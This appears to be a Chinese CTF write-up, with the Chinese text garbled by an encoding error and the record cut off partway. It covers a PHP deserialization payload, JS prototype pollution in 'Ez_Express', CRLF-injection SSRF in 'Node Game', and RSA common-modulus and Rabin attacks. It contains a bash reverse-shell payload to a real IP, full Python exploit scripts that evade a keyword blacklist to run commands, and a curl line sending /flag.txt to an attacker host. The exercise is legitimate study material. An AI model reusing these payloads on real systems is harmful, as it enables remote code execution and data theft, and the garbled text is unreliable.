username=?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:3:{s:3:&quot;age&quot;;s:0:&quot;&quot;;s:8:&quot;nickname&quot;;s:1:&quot;1&quot;;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:8:{s:8:&quot;hostname&quot;;s:9:&quot;127.0.0.1&quot;;s:6:&quot;dbuser&quot;;s:4:&quot;root&quot;;s:6:&quot;dbpass&quot;;s:4:&quot;root&quot;;s:8:&quot;database&quot;;s:4:&quot;test&quot;;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;N;s:6:&quot;mysqli&quot;;N;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;}}}}} é€šè¿‡POSTæ–¹å¼ï¼Œå°†payloadæ‰“å…¥update.phpå³å¯æ‹¿åˆ°ç»è¿‡md5åŠ å¯†ä¹‹åçš„passwordï¼Œè§£å¯†å³å¯ã€‚æœ¬é“é¢˜æ˜¯åœ¨BUUå¤ç°çš„ï¼Œå¯†ç å·²ç»è¢«æ”¹ä¸ºäº†glzjinäº†ï¼Œç™»å½•å³å¯æ‹¿flagã€‚ è¡¥å……ï¼šsmityå¸ˆå‚…ç»™äº†ä¸€ä¸ªå¾ˆè¯¦ç»†çš„é¢˜è§£ï¼Œå¯ä»¥å¥½å¥½å­¦å­¦è¿™é¢˜ï¼šè¿™é‡Œã€‚ Ez_Expressè€ƒå¯ŸJSåŸå‹é“¾æ±¡æŸ“ï¼ŒJSä¹‹å‰æ²¡å­¦è¿‡ï¼Œåœ¨BUUä¸Šå¤ç°çš„è¿‡ç¨‹ä¸­æ…¢æ…¢å­¦äº†ä¸€äº›ï¼Œå…³äºJSåŸå‹é“¾çš„æ±¡æŸ“å‚è€ƒPç¥çš„æ–‡ç« ã€‚ é¢˜ç›®åˆ†æè¿›å…¥é¢˜ç›®ï¼Œå¯ä»¥çœ‹åˆ°ä¸€äº›æç¤ºï¼š è¦æ±‚æˆ‘ä»¬å¿…é¡»ä»¥ADMINç™»å½•ï¼Œä½†æ˜¯è¿™ä¸ªç”¨æˆ·åˆæ³¨å†Œä¸äº†â€¦ dirsearchæ‰«åå°å¯ä»¥å‘ç°www.zipçš„å­˜åœ¨ï¼ŒæŠŠæºç æ‹¿ä¸‹æ¥ï¼Œçœ‹çœ‹å…¶ä¸­çš„ç„æœºã€‚ åœ¨index.jsä¸­çš„loginè·¯ç”±ä¸‹å‘ç°çªç ´ç‚¹ï¼š if(req.body.Submit==\"register\"){ if(safeKeyword(req.body.userid)){ res.end(\"&lt;script&gt;alert('forbid word');history.go(-1);&lt;/script&gt;\") } req.session.user={ 'user':req.body.userid.toUpperCase(), 'passwd': req.body.pwd, 'isLogin':false } res.redirect('/'); } å¯ä»¥çœ‹åˆ°ï¼Œåœ¨æ³¨å†Œçš„æ—¶å€™å­˜åœ¨toUpperCase()çš„ä½¿ç”¨ï¼Œè¿™ä¸ªå‡½æ•°æ˜¯å­˜åœ¨å¯åˆ©ç”¨çš„æ¼æ´çš„ï¼Œå³åˆ©ç”¨ç‰¹æ®Šå­—ç¬¦è¿›è¡Œç»•è¿‡ï¼š toUpperCase():Ä± ==&gt; IÅ¿ ==&gt; S å¦å¤–JSä¸­çš„toLowerCase()å‡½æ•°ä¹Ÿå­˜åœ¨å¯¹ç‰¹æ®Šå­—ç¬¦çš„ä¸è§„èŒƒå¤„ç†ï¼š toLowerCase():Ä° ==&gt; iâ„ª ==&gt; k æ ¹æ®å¦‚ä¸Šç‰¹æ€§ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨admÄ±nèº«ä»½è¿›è¡Œæ³¨å†Œï¼Œç»è¿‡toUpperCase()å¤„ç†ä¾¿æˆäº†ADMINä»è€ŒæˆåŠŸç™»å½•ï¼š å¯ä»¥çœ‹åˆ°ï¼Œæç¤ºäº†flagçš„ä½ç½®ï¼Œåº”è¯¥å°±éœ€è¦RCEæ¥è¿›è¡Œè¯»å–äº†ã€‚ å†å®¡ä»£ç ï¼Œå‘ç°index.jsä¸­å­˜åœ¨mergeå’Œcloneï¼Œæ ¹æ®åœ¨å‰é¢æåˆ°çš„Pç¥çš„æ–‡ç« ä¸­çš„å­¦ä¹ ï¼ŒçŒœæµ‹åº”è¯¥æ˜¯JSåŸå‹é“¾æ±¡æŸ“ï¼š const merge = (a, b) =&gt; { for (var attr in b) { if (isObject(a[attr]) &amp;&amp; isObject(b[attr])) { merge(a[attr], b[attr]); } else { a[attr] = b[attr]; } } return a}const clone = (a) =&gt; { return merge({}, a);} è¿›ä¸€æ­¥åœ¨actionè·¯ç”±ä¸‹å‘ç°äº†cloneçš„ä½¿ç”¨ï¼š router.post('/action', function (req, res) { if(req.session.user.user!=\"ADMIN\"){res.end(\"&lt;script&gt;alert('ADMIN is asked');history.go(-1);&lt;/script&gt;\")} req.session.user.data = clone(req.body); res.end(\"&lt;script&gt;alert('success');history.go(-1);&lt;/script&gt;\"); }) æ˜¯å°†reqè¯·æ±‚ä¸­çš„å†…å®¹æ‹¼æ¥åˆ°sessionçš„è¿‡ç¨‹ï¼Œæ˜¾ç„¶ï¼Œreq.bodyæ˜¯æˆ‘ä»¬å¯æ§çš„ï¼Œæ˜¯è€ƒå¯ŸåŸå‹é“¾æ±¡æŸ“æ²¡é”™äº†ã€‚ actionè·¯ç”±æ˜¯å•¥æ—¶å€™è®¿é—®çš„å‘¢ï¼Ÿå…¶å®å°±æ˜¯æäº¤è¾“å…¥çš„åœ°æ–¹ï¼š è§£é¢˜ä½†æ˜¯æ€ä¹ˆæ‰èƒ½å®ç°åŸå‹é“¾çš„æ±¡æŸ“å‘¢ï¼Ÿçœ‹åˆ°infoè·¯ç”±ä¸‹å‡ºç°äº†outputFunctionNameï¼Œå‚è€ƒå¦ä¸€ç¯‡æ–‡ç« ï¼Œè®²äº†åˆ©ç”¨outputFunctionNameè¿›è¡Œæ±¡æŸ“çš„æ–¹å¼ï¼Œpayloadå¦‚ä¸‹ï¼š {\"__proto__\":{\"outputFunctionName\":\"_tmp1;global.process.mainModule.require('child_process').exec('bash -c \\\"bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1\\\"');var __tmp2\"}} å¤§è‡´å«ä¹‰å°±æ˜¯ï¼š åˆ©ç”¨å¯¹è±¡çš„__proto__å±æ€§ï¼Œå‘ç±»çš„åŸå‹å¯¹è±¡prototypeä¸­å†™å…¥ä¸€ä¸ªæ–°çš„å±æ€§å’Œå±æ€§å€¼ï¼Œå³outputFunctionNameå’Œå¯¹åº”çš„å€¼ï¼Œå¦‚æ­¤ä»¥æ¥ï¼Œè¯¥ç±»å°±å­˜åœ¨äº†è¿™ä¸ªå±æ€§ï¼Œå®ä¾‹åŒ–çš„æ—¶å€™ä¹Ÿä¼šç»§æ‰¿ï¼Œå› æ­¤å½“æˆ‘ä»¬å†å»è®¿é—®infoè·¯ç”±çš„æ—¶å€™res.outputFunctionNameçš„å€¼å·²ç»æ˜¯æˆ‘ä»¬å†™å…¥çš„payloadä¸­çš„RCEéƒ¨åˆ†çš„å†…å®¹äº†ï¼Œä»è€Œå³å¯åœ¨VPSä¸Šåå¼¹shellã€‚ ç”±äºæ˜¯åœ¨BUUä¸Šå¤ç°çš„ï¼Œå¼€ä¸€å°å†…ç½‘ä¸»æœºï¼Œæ‹¿åˆ°ipä¹‹åæ„é€ payloadï¼š {\"__proto__\":{\"outputFunctionName\":\"_tmp1;global.process.mainModule.require('child_process').exec('bash -c \\\"bash -i &gt;&amp; /dev/tcp/174.1.33.241/8899 0&gt;&amp;1\\\"');var __tmp2\"}} åŒæ—¶åœ¨è¯¥å†…ç½‘ä¸»æœºä¸Šè¿›è¡Œç›‘å¬ï¼Œåœ¨è®¿é—®actionè·¯ç”±çš„æ—¶å€™æŠ“åŒ…æ›´æ”¹Content-Typeä¸ºapplication/jsonï¼Œå¹¶å°†æˆ‘ä»¬å¦‚ä¸Šæ„é€ çš„payloadå†™å…¥ï¼š å‰é¢å°±æ±¡æŸ“äº†åŸå‹é“¾äº†ï¼Œç„¶åè®¿é—®infoè·¯ç”±è¿›è¡Œå‘½ä»¤çš„æ‰§è¡Œï¼š ä»è€Œæ‹¿åˆ°shellï¼š ç„¶åå°±å¯ä»¥éšä¾¿è¯»å–æ–‡ä»¶ï¼Œæ‹¿åˆ°flagäº†ã€‚ æœ‰å…³JSçš„é¢˜ç›®å…¶å®æ²¡æ€ä¹ˆåšè¿‡ï¼Œå› ä¸ºè¿˜æ²¡æœ‰ä¸“é—¨å­¦è¿‡JSï¼Œä½†æ˜¯JSç¡®å®è¶Šæ¥ç”¨çš„è¶Šå¤šï¼Œé¢˜ä¹Ÿä¸å°‘ï¼Œå¾ˆæœ‰å­¦çš„å¿…è¦ã€‚ Node Gameåˆæ˜¯ä¸€é“JSçš„é¢˜ï¼Œè€ƒå¯ŸCRLFæ³¨å…¥ã€SSRF CRLFæ³¨å…¥å‚è€ƒè¿™é‡Œï¼š CRLFæ³¨å…¥æ¼æ´ï¼Œæ˜¯å› ä¸ºWebåº”ç”¨æ²¡æœ‰å¯¹ç”¨æˆ·è¾“å…¥åšä¸¥æ ¼éªŒè¯ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥è¾“å…¥ä¸€äº›æ¶æ„å­—ç¬¦ã€‚æ”»å‡»è€…ä¸€æ—¦å‘è¯·æ±‚è¡Œæˆ–é¦–éƒ¨ä¸­çš„å­—æ®µæ³¨å…¥æ¶æ„çš„CRLFï¼Œå°±èƒ½æ³¨å…¥ä¸€äº›é¦–éƒ¨å­—æ®µæˆ–æŠ¥æ–‡ä¸»ä½“ï¼Œå¹¶åœ¨å“åº”ä¸­è¾“å‡ºï¼Œæ‰€ä»¥åˆç§°ä¸ºHTTPå“åº”æ‹†åˆ†æ¼æ´ï¼ˆHTTP Response Splittingï¼‰ã€‚ é¢˜ç›®åˆ†æè¿›å…¥é¢˜ç›®å³å¯æ‹¿åˆ°æºç ï¼š var express = require('express');var app = express();var fs = require('fs');var path = require('path');var http = require('http');var pug = require('pug'); //var morgan = require('morgan');const multer = require('multer');app.use(multer({dest: './dist'}).array('file'));app.use(morgan('short'));app.use(\"/uploads\",express.static(path.join(__dirname, '/uploads')))app.use(\"/template\",express.static(path.join(__dirname, '/template')))app.get('/', function(req, res) { var action = req.query.action?req.query.action:\"index\"; if( action.includes(\"/\") || action.includes(\"\\\\\") ){ res.send(\"Errrrr, You have been Blocked\"); } file = path.join(__dirname + '/template/'+ action +'.pug'); var html = pug.renderFile(file); res.send(html);});//SSRFapp.post('/file_upload', function(req, res){ var ip = req.connection.remoteAddress; var obj = { msg: '', } if (!ip.includes('127.0.0.1')) { obj.msg=\"only admin's ip can use it\" res.send(JSON.stringify(obj)); return } fs.readFile(req.files[0].path, function(err, data){ if(err){ obj.msg = 'upload failed'; res.send(JSON.stringify(obj)); }else{ var file_path = '/uploads/' + req.files[0].mimetype +\"/\"; var file_name = req.files[0].originalname var dir_file = __dirname + file_path + file_name if(!fs.existsSync(__dirname + file_path)){ try { fs.mkdirSync(__dirname + file_path) } catch (error) { obj.msg = \"file type error\"; res.send(JSON.stringify(obj)); return } } try { fs.writeFileSync(dir_file,data) obj = { msg: 'upload success', filename: file_path + file_name } } catch (error) { obj.msg = 'upload failed'; } res.send(JSON.stringify(obj)); } })})app.get('/source', function(req, res) { res.sendFile(path.join(__dirname + '/template/source.txt'));});app.get('/core', function(req, res) { var q = req.query.q; var resp = \"\"; if (q) { var url = 'http://localhost:8081/source?' + q console.log(url) var trigger = blacklist(url); if (trigger === true) { res.send(\"&lt;p&gt;error occurs!&lt;/p&gt;\"); } else { try { http.get(url, function(resp) { resp.setEncoding('utf8'); resp.on('error', function(err) { if (err.code === \"ECONNRESET\") { console.log(\"Timeout occurs\"); return; } }); resp.on('data', function(chunk) { try { resps = chunk.toString(); res.send(resps); }catch (e) { res.send(e.message); } }).on('error', (e) =&gt; { res.send(e.message);}); }); } catch (error) { console.log(error); } } } else { res.send(\"search param 'q' missing!\"); }})function blacklist(url) { var evilwords = [\"global\", \"process\",\"mainModule\",\"require\",\"root\",\"child_process\",\"exec\",\"\\\"\",\"'\",\"!\"]; var arrayLen = evilwords.length; for (var i = 0; i &lt; arrayLen; i++) { const trigger = url.includes(evilwords[i]); if (trigger === true) { return true } }}var server = app.listen(8081, function() { var host = server.address().address var port = server.address().port console.log(\"Example app listening at http://%s:%s\", host, port)}) åˆ†æä»£ç å¾—çŸ¥å‡ ä¸ªè·¯ç”±çš„ç”¨å¤„ï¼š 1ã€ /ï¼šä¼šåŒ…å«/templateç›®å½•ä¸‹çš„ä¸€ä¸ªpugæ¨¡æ¿æ–‡ä»¶æ¥ç”¨pubè¿›è¡Œæ¸²æŸ“ï¼› 2ã€/sourceï¼šå›æ˜¾æºç ï¼› 3ã€/file_uploadï¼šé™åˆ¶äº†åªèƒ½ç”±IPä¸º127.0.0.1è¿›è¡Œæ–‡ä»¶ä¸Šä¼ ï¼Œå¹¶ä¸”æˆ‘ä»¬å¯ä»¥é€šè¿‡æ§åˆ¶MIMEè¿›è¡Œç›®å½•ç©¿è¶Šï¼Œä»è€Œå°†æ–‡ä»¶ä¸Šä¼ åˆ°ä»»æ„ç›®å½•ï¼› 4ã€/coreï¼šé€šè¿‡qå‘å†…ç½‘çš„8081ç«¯å£ä¼ å‚ï¼Œç„¶åè·å–æ•°æ®å†è¿”å›å¤–ç½‘ï¼Œå¹¶ä¸”å¯¹urlè¿›è¡Œé»‘åå•çš„è¿‡æ»¤ï¼Œä½†æ˜¯è¿™é‡Œçš„é»‘åå•å¯ä»¥ç›´æ¥ç”¨å­—ç¬¦ä¸²æ‹¼æ¥ç»•è¿‡ã€‚ ä½†æ˜¯/coreè·¯ç”±ä¸‹ä¸èƒ½ç›´æ¥SSRFï¼Œè€Œæ˜¯éœ€è¦åˆ©ç”¨Node jsçš„ç¼–ç å®‰å…¨é—®é¢˜ï¼ˆå‚è€ƒè¿™é‡Œï¼‰ï¼Œå¯¹ç¼–ç ç²¾å¿ƒæ„é€ è¿›è¡ŒCRLFæ³¨å…¥ä»è€Œæ¥è¿›è¡ŒSSRFï¼Œé‚£ä¹ˆè§£é¢˜æ€è·¯å°±æ˜ç¡®äº†ï¼š 1ã€åˆ©ç”¨CRLFæ³¨å…¥è¿›è¡ŒSSRF 2ã€åˆ©ç”¨SSRFä¼ªé€ æœ¬åœ°IPè¿›è¡Œæ–‡ä»¶ä¸Šä¼  3ã€ä¸Šä¼ åŒ…å«å‘½ä»¤æ‰§è¡Œä»£ç çš„pugæ–‡ä»¶åˆ°/templateç›®å½• 4ã€åˆ©ç”¨actionå‚æ•°åŒ…å«æ–‡ä»¶ï¼Œæ‰§è¡Œå‘½ä»¤ è§£é¢˜å‚è€ƒä¸Šé¢æ–‡ç« å¯çŸ¥ï¼Œæˆ‘ä»¬å¯ä»¥æ„é€ ä¸º\\u010D\\u010Aæ¥æ›¿æ¢æ¢è¡Œ\\r\\nï¼ˆ%0D%0Aï¼‰ï¼Œå…¶ä»–çš„ä¸€äº›ç‰¹æ®Šå­—ç¬¦ä¹Ÿå¦‚æ­¤æ„é€ ï¼Œå¦‚ç©ºæ ¼(%20)æ„é€ ç¼–ç ä¸º\\u0120ï¼Œ+(%2B)æ„é€ ç¼–ç æ„é€ ä¸º\\u012Bâ€¦ æ ¹æ®è¿™ä¸ªæ–¹å¼ï¼Œæ„é€ æ‹†åˆ†è¯·æ±‚ä»è€Œè¿›è¡ŒSSRFï¼Œå‚è€ƒç½‘ä¸Šå¸ˆå‚…çš„expï¼š import requestspayload = \"\"\" HTTP/1.1Host: 127.0.0.1Connection: keep-alivePOST /file_upload HTTP/1.1Host: 127.0.0.1Content-Length: {}Content-Type: multipart/form-data; boundary=----WebKitFormBoundarysAs7bV3fMHq0JXUt{}\"\"\".replace('\\n', '\\r\\n')body = \"\"\"------WebKitFormBoundarysAs7bV3fMHq0JXUtContent-Disposition: form-data; name=\"file\"; filename=\"ggb0n.pug\"Content-Type: ../template-var x = eval(\"glob\"+\"al.proce\"+\"ss.mainMo\"+\"dule.re\"+\"quire('child_'+'pro'+'cess')['ex'+'ecSync']('cat /flag.txt').toString()\")-return x------WebKitFormBoundarysAs7bV3fMHq0JXUt--\"\"\".replace('\\n', '\\r\\n')payload = payload.format(len(body), body) \\ .replace('+', '\\u012b') \\ .replace(' ', '\\u0120') \\ .replace('\\r\\n', '\\u010d\\u010a') \\ .replace('\"', '\\u0122') \\ .replace(\"'\", '\\u0a27') \\ .replace('[', '\\u015b') \\ .replace(']', '\\u015d') \\ + 'GET' + '\\u0120' + '/'requests.get( 'http://5a1643b9-eac5-48ba-92b3-36516bcde120.node3.buuoj.cn/core?q=' + payload)print(requests.get( 'http://5a1643b9-eac5-48ba-92b3-36516bcde120.node3.buuoj.cn/?action=ggb0n').text) å‡ºé¢˜å¸ˆå‚…çš„expå…·æœ‰æ›´é«˜çš„çµæ´»æ€§ï¼š import requestsimport syspayloadRaw = \"\"\"x HTTP/1.1POST /file_upload HTTP/1.1Host: localhost:8081User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:72.0) Gecko/20100101 Firefox/72.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateContent-Type: multipart/form-data; boundary=---------------------------12837266501973088788260782942Content-Length: 6279Origin: http://localhost:8081Connection: closeReferer: http://localhost:8081/?action=uploadUpgrade-Insecure-Requests: 1-----------------------------12837266501973088788260782942Content-Disposition: form-data; name=\"file\"; filename=\"5am3_get_flag.pug\"Content-Type: ../template- global.process.mainModule.require('child_process').execSync('evalcmd')-----------------------------12837266501973088788260782942--\"\"\"def getParm(payload): payload = payload.replace(\" \",\"%C4%A0\") payload = payload.replace(\"\\n\",\"%C4%8D%C4%8A\") payload = payload.replace(\"\\\"\",\"%C4%A2\") payload = payload.replace(\"'\",\"%C4%A7\") payload = payload.replace(\"`\",\"%C5%A0\") payload = payload.replace(\"!\",\"%C4%A1\") payload = payload.replace(\"+\",\"%2B\") payload = payload.replace(\";\",\"%3B\") payload = payload.replace(\"&amp;\",\"%26\") # Bypass Waf payload = payload.replace(\"global\",\"%C5%A7%C5%AC%C5%AF%C5%A2%C5%A1%C5%AC\") payload = payload.replace(\"process\",\"%C5%B0%C5%B2%C5%AF%C5%A3%C5%A5%C5%B3%C5%B3\") payload = payload.replace(\"mainModule\",\"%C5%AD%C5%A1%C5%A9%C5%AE%C5%8D%C5%AF%C5%A4%C5%B5%C5%AC%C5%A5\") payload = payload.replace(\"require\",\"%C5%B2%C5%A5%C5%B1%C5%B5%C5%A9%C5%B2%C5%A5\") payload = payload.replace(\"root\",\"%C5%B2%C5%AF%C5%AF%C5%B4\") payload = payload.replace(\"child_process\",\"%C5%A3%C5%A8%C5%A9%C5%AC%C5%A4%C5%9F%C5%B0%C5%B2%C5%AF%C5%A3%C5%A5%C5%B3%C5%B3\") payload = payload.replace(\"exec\",\"%C5%A5%C5%B8%C5%A5%C5%A3\") return payloaddef run(url,cmd): payloadC = payloadRaw.replace(\"evalcmd\",cmd) urlC = url+\"/core?q=\"+getParm(payloadC) requests.get(urlC) requests.get(url+\"/?action=5am3_get_flag\").textif __name__ == '__main__': targetUrl = sys.argv[1] cmd = sys.argv[2] print run(targetUrl,cmd)# python exp.py http://127.0.0.1:8081 \"curl vps-ip:port -X POST -d `cat /flag.txt`\" åŒå¿—ä»éœ€åŠªåŠ›å•Šï¼ å‚è€ƒï¼šhttps://blog.csdn.net/qq_42181428/article/details/104474414?fps=1&amp;locationNum=2https://blog.5am3.com/2020/02/11/ctf-node1/#%E8%87%AA%E5%B7%B1%E5%87%BA%E7%9A%84-node-game Crypto-Easy_RSAè€ƒå¯Ÿå…±æ¨¡æ”»å‡» è§£é¢˜ç»™çš„é™„ä»¶å†…å®¹å¦‚ä¸‹ï¼š n = 27560959918385616419486273009594513460044316476337842585463553105701869531698366304637678008602799005181601310816935394003041930445509801196554897781529962616349442136039951911764620999116915741924245788988332766182305635804754798018489793066811741026902011980807157882639313892932653620491354630354060462594865874663773934670618930504925812833202047183166423043264815905853486053255310346030416687430724204177468176762512566055165798172418622268751968793997676391170773216291607752885987933866163158257336522567086228092863302685493888839866559622429685925525799985062044536032584132602747754107800116960090941957657e1 = 464857e2 = 190529c1 = 21823306870841016169952481786862436752894840403702198056283357605213928505593301063582851595978932538906067287633295577036042158302374948726749348518563038266373826871950904733691046595387955703305846728530987885075910490362453202598654326947224392718573893241175123285569008519568745153449344966513636585290770127055273442962689462195231016899149101764299663284434805817339348868793709084130862028614587704503862805479792184019334567648078767418576316170976110991128933886639402771294997811025942544455255589081280244545901394681866421223066422484654301298662143648389546410087950190562132305368935595374543145047531c2 = 9206260935066257829121388953665257330462733292786644374322218835580114859866206824679553444406457919107749074087554277542345820215439646770680403669560474462369400641865810922332023620699210211474208020801386285068698280364369889940167999918586298280468301097349599560130461998493342138792264005228209537462674085410740693861782834212336781821810115004115324470013999092462310414257990310781534056807393206155460371454836230410545171068506044174001172922614805135260670524852139187370335492876094059860576794839704978988507147972109411033377749446821374195721696073748745825273557964015532261000826958288349348269664 è¿™å°±å¾ˆæ˜æ˜¾äº†ï¼Œå¯¹ç›¸åŒçš„æ˜æ–‡ï¼Œåˆ©ç”¨ç›¸åŒçš„æ¨¡æ•°nï¼Œä¸åŒçš„eè¿›è¡ŒåŠ å¯†ï¼Œæ˜¾ç„¶çš„å…±æ¨¡æ”»å‡»ã€‚ç›´æ¥ä¸Šè„šæœ¬äº†ï¼š import sysimport binasciisys.setrecursionlimit(1000000)def egcd(a, b): if a == 0: return (b, 0, 1) else: g, y, x = egcd(b % a, a)ä¸ªå­—ç¬¦ return (g, x - (b // a) * y, y)def modinv(a, m): g, x, y = egcd(a, m) if g != 1: raise Exception('modular inverse does not exist') else: return x % mn = 27560959918385616419486273009594513460044316476337842585463553105701869531698366304637678008602799005181601310816935394003041930445509801196554897781529962616349442136039951911764620999116915741924245788988332766182305635804754798018489793066811741026902011980807157882639313892932653620491354630354060462594865874663773934670618930504925812833202047183166423043264815905853486053255310346030416687430724204177468176762512566055165798172418622268751968793997676391170773216291607752885987933866163158257336522567086228092863302685493888839866559622429685925525799985062044536032584132602747754107800116960090941957657e1 = 464857e2 = 190529c1 = 21823306870841016169952481786862436752894840403702198056283357605213928505593301063582851595978932538906067287633295577036042158302374948726749348518563038266373826871950904733691046595387955703305846728530987885075910490362453202598654326947224392718573893241175123285569008519568745153449344966513636585290770127055273442962689462195231016899149101764299663284434805817339348868793709084130862028614587704503862805479792184019334567648078767418576316170976110991128933886639402771294997811025942544455255589081280244545901394681866421223066422484654301298662143648389546410087950190562132305368935595374543145047531c2 = 9206260935066257829121388953665257330462733292786644374322218835580114859866206824679553444406457919107749074087554277542345820215439646770680403669560474462369400641865810922332023620699210211474208020801386285068698280364369889940167999918586298280468301097349599560130461998493342138792264005228209537462674085410740693861782834212336781821810115004115324470013999092462310414257990310781534056807393206155460371454836230410545171068506044174001172922614805135260670524852139187370335492876094059860576794839704978988507147972109411033377749446821374195721696073748745825273557964015532261000826958288349348269664s = egcd(e1, e2)s1 = s[1]s2 = s[2]if s1&lt;0: s1 = - s1 c1 = modinv(c1, n)elif s2&lt;0: s2 = - s2 c2 = modinv(c2, n)m=(pow(c1,s1,n)*pow(c2,s2,n)) % nprint (binascii.unhexlify(hex(m)[2:].strip(\"L\"))) å…³äºRSAæ”»å‡»çš„ä¸€äº›å¸¸è§é¢˜ç›®ï¼Œå¯ä»¥å‚è€ƒè¿™é‡Œã€‚ Crypto-warm_upä¸€é“RSAæ”»å‡»é¢˜ï¼Œæ¯”èµ›çš„æ—¶å€™ç”¨äº†å¾ˆä¹…çš„æ—¶é—´ï¼Œç»“æœæ–¹æ³•æ˜¯é‚£ä¸ªæ–¹æ³•ï¼Œä¹Ÿæ²¡æ¯›ç—…ï¼Œä½†æ˜¯æ‹¿åˆ°çš„ä¸­é—´è§£å¯†ç»“æœå°±æ˜¯è·Ÿæ­£ç¡®çš„ä¸ä¸€æ ·â€¦ã€è¡¥å……ã€‘åæ¥å¾—çŸ¥æ˜¯åˆ©ç”¨Rabinç®—æ³•æ¥è§£å¯†ï¼Œ é¢˜ç›®åˆ†æé¦–å…ˆæ‹¿åˆ°åŠ å¯†çš„è„šæœ¬ï¼šchallengeï¼š from Crypto.Util.number import *from encode import KEYq=getPrime(1024)p=getPrime(1024)r=getPrime(1024)s=getPrime(1500)e1=125794e2=42373n1=p*q# p=131007115323263999345439921359227318254405259922548848874604821887442317315261280241204120172695148419556904875799765832598963733615261986846902786588239855657188269808050049322273049247577603319550134241252668567291670945189847048114844786099701880760746513002722191178146535455786553456997962473256126933599# q=119483326784566375381311671166934261653966910443478433390480121272123328703673727110548386173243715369452830115984647613984491314122410531350348274710343333683717539768667655774410095306308786327548868489032433387156558717074449072976228756713826882644799579064381868958833899404263434981929880125095896045279n2=p*r# r=125865800078882436358190150840086704132269782327092865891978833903435318406585569079365400123511664535093591726335541806103608520149741821723730509181335231384826827110615769921634583280405181533715780121294953290009221367811719652713563785099152724624248766800252106719691710099748709715428046927462566738829n3=p*q*s# s=4381527556155456244163866461213062154975584084098516713465580696307104582336232806581070200178877144056318286852510416984171734722261473011812834553119204840984224160234243628578437239474676744592256886496775536777147355925487433224470975028941234194214177866322189418677266623335736030464485482684975053531544588046871751319647627210975030993527752551643707233557167595205555007238628961572027648064667065121254775370786901687256744800890945396435909316593963191272036460122138655751400930994411285603646950022989642830534704209469689551712512249174150742858665648252625354876868232433296490519493372739129388386546c1=pow(s,e1,n1)Key=int(KEY.encode('hex'),16)key_encode=pow(Key,e2,n3)with open(\"enc\",\"a\")as f: f.write(\"c1: \"+str(c1)+\"\\n\") f.write(\"n1: \"+str(n1)+\"\\n\") f.write(\"n2: \"+str(n2)+\"\\n\") f.write(\"key_encode: \"+str(key_encode)+\"\\n\") encodeï¼š from flag import flagimport osKEY = os.urandom(len(flag))dec=int(flag.encode('hex'),16)assert len(bin(dec)[2:])==335mask=int('1'*335,2)dec=(dec^dec&lt;&lt;200 )&amp;maskenc=dec^bytes_to_long(KEY)print \"enc: \"+str(enc)#enc: 17403902166198774030870481073653666694643312949888760770888896025597904503707411677223946079009696809 å®¡è®¡ä»£ç å¯çŸ¥ï¼Œè¦æ‹¿åˆ°flagï¼Œæˆ‘ä»¬é¦–å…ˆéœ€è¦æ‹¿åˆ°KEYï¼Œè€ŒKEYæ˜¯ç»è¿‡RSAåŠ å¯†çš„ã€‚ä½†æ˜¯è§‚å¯ŸRSAä»£ç å‘ç°n1å’Œn2æœ‰å…¬çº¦æ•°pï¼Œåˆ©ç”¨æ¬§å‡ é‡Œä½•ç®—æ³•å³å¯æ±‚å¾—ï¼š def gcd(m,n): if n==0: #è€ƒè™‘ç‰¹æ®Šæƒ…å†µ print(\"n is not equal 0!\") else: while m%n!=0: new=m m=n n=new%n return n è¿™æ ·æˆ‘ä»¬å°±æœ‰äº†pã€qã€rï¼Œä½†æ˜¯è¦å¾—åˆ°KEYï¼Œæˆ‘ä»¬éœ€è¦æ‹¿åˆ°sï¼Œè¿™ä¸ªåœ°æ–¹å‚è€ƒäº†ç½‘ä¸Šçš„ä¸€ç¯‡æ–‡ç« ä¸­çš„ä¸€éƒ¨åˆ†æ¥æ±‚ï¼Œä½†æ˜¯æ±‚å¾—çš„sä¸æ˜¯1500bitã€ä½†æ˜¯åŠ å¯†çš„å¯†æ–‡å´æ˜¯ä¸€æ ·çš„â€¦ç„¶åä¹Ÿå°±æ²¡æœ‰åšä¸‹å»äº†ï¼Œç­‰WPå§â€¦åæ¥ä¸€ä½å¸ˆå‚…åˆ†äº«äº†è‡ªå·±çš„æ€»ç»“ï¼Œå­¦ä¹ ä¸‹å§ï¼šhttp://www.soreatu.com/ctf/writeups/Writeup%20for%20Crypto%20problems%20in%20NCTF%202019.html#easyrsaå¸ˆå‚…ç»™äº†ä»–çš„è„šæœ¬åšå‚è€ƒï¼Œä½†æ˜¯è¿˜æ²¡å®Œå…¨ææ˜ç™½ï¼Œç­‰WPå‡ºæ¥ç ”ç©¶å¥½äº†å†è¡¥å……ã€‚ è¡¥å……åˆ©ç”¨Rabinç®—æ³•è§£å¯†RSAéƒ¨åˆ†ï¼Œç„¶ååˆ©ç”¨è¿ç®—çš„ç‰¹æ€§å°†dec=(dec^dec&lt;&lt;200)&amp;maské€šè¿‡dec=(dec^dec&gt;&gt;200)&amp;maskè¿›è¡Œè¿˜åŸï¼Œè§£å¯†è„šæœ¬å¦‚ä¸‹ï¼š import gmpy2import libnumc1 = 9977992111543474765993146699435780943354123551515555639473990571150196059887059696672744669228084544909025528146255490100789992216506586730653100894938711107779449187833366325936098812758615334617812732956967746820046321447169099942918022803930068529359616171025439714650868454930763815035475473077689115645913895433110149735235210437428625515317444853803605457325117693750834579622201070329710209543724812590086065816764917135636424809464755834786301901125786342127636605411141721732886212695150911960225370999521213349980949049923324623683647865441245309856444824402766736069791224029707519660787841893575575974855n1 = 15653165971272925436189715950306169488648677427569197436559321968692908786349053303839431043588260338317859397537409728729274630550454731306685369845739785958309492188309739135163206662322980634812713910231189563194520522299672424106135656125893413504868167774287157038801622413798125676071689173117885182987841510070517898710350608725809906704505037866925358298525340393278376093071591988997064894579887906638790394371193617375086245950012269822349986482584060745112453163774290976851732665573217485779016736517696391513031881133151033844438314444107440811148603369668944891577028184130587885396017194863581130429121n2 = 